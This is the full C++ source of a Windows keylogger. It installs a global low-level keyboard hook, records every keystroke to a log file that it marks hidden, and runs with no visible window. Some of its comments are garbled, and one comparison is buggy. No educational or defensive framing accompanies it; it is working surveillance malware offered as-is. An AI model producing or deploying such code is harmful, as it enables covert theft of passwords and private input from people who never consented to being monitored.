#define _WIN32_WINNT 0x0400
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	
#include <windows.h>
#include <Winuser.h>
#include <string>
#include <fstream>
#include <iostream>
#include <stdlib.h>
using namespace std;
#define CAP 20

bool cap;
ofstream of;
MSG msg;
string r;
string passage;
DWORD processid = 0;
HHOOK hook = 0;

void openfile() {
	of.open("log.txt", ios::app);
	if (!of)
		exit(0);
}

void closefile() {
	of.close();
}

string translate(int vkCode, int scanCode) {
	string s;
	if (48 <= vkCode && vkCode <= 57)
		s = '0' + vkCode - 48;
	else if (65 <= vkCode && vkCode <= 90 && cap)
		s = 'A' + vkCode - 65;
	else if (65 <= vkCode && vkCode <= 90 && !cap)
		s = 'a' + vkCode - 65;

	else if (vkCode == 8)
		s = "[Backspace]";
	else if (vkCode == 9)
		s = "[Tab]";
	else if (vkCode == 13 || vkCode == 108)
		s = "\n";
	else if (vkCode == cap)
		s = "[Caps Lock]";
	else if (vkCode == 32)
		s = ' ';
	else if (vkCode == 37)
		s = "[<-]";
	else if (vkCode == 39)
		s = "[->]";
	else if (vkCode == 41)
		s = '`';
	else if (vkCode == 106)
		s = '*';
	else if (vkCode == 107)
		s = '+';
	else if (vkCode == 109)
		s = '-';
	else if (vkCode == 110)
		s = '.';
	else if (vkCode == 111)
		s = '/';
	else if (vkCode == 160 || vkCode == 161)
		s = "[Shift]";
	else if (vkCode == 162 || vkCode == 163)
		s = "[Ctrl]";
	else if (vkCode == 164 || vkCode == 165)
		s = "[Alt]";
	else if (vkCode == 186)
		s = ';';
	else if (vkCode == 187)
		s = '+';
	else if (vkCode == 188)
		s = ',';
	else if (vkCode == 189)
		s = '-';
	else if (vkCode == 190)
		s = '.';
	else if (vkCode == 191)
		s = '/';
	else if (vkCode == 219)
		s = '[';
	else if (vkCode == 220)
		s = '\\';
	else if (vkCode == 221)
		s = ']';
	else if (vkCode == 222)
		s = '\'';
	else 
		s = '\0';
	return s;
}


LRESULT CALLBACK hookproc (int code, WPARAM wparam, LPARAM lparam) {
	bool flag = false;
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)	//¼ì²â¼üÅÌÊäÈë
		flag = true;
	if (wparam == WM_KEYDOWN && p->vkCode == CAP) {		//¼ì²â¼üÅÌCapºÍShift×´Ì¬
		cap = !cap;
		openfile();
		of << "[Caps Lock]";
		closefile();
	}
	if (flag) {
		openfile();
		of << translate(p->vkCode, p->scanCode);
		closefile();
	}
	::SetFileAttributes("log.txt", FILE_ATTRIBUTE_HIDDEN);	//Ôö¼ÓÒþ²ØÎÄ¼þÊôÐÔ
	return CallNextHookEx (hook, code, wparam, lparam);
 }

void messageloop() {
	while (GetMessage (&msg, NULL, 0, 0)) {
		TranslateMessage (&msg);
		DispatchMessage (&msg);
	};
}

void sethook() {
	processid = GetCurrentThreadId ();
	hook = SetWindowsHookEx (WH_KEYBOARD_LL, &hookproc, GetModuleHandle (NULL), 0);
	if (hook == NULL)
		exit(0);
}


int main()  {
	sethook();
	messageloop();
	UnhookWindowsHookEx(hook);
	return 0;
};